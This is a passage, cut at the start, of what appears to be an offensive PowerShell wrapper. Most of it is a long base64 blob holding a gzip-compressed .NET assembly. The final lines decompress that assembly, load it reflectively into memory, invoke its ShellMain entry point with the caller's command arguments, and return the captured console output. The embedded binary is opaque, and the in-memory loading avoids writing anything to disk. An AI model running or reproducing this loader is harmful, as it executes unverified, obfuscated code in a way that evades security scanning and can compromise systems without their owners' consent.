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"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)

    [ShellMainClass]::ShellMain($Command.Split(" "))

    [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
}
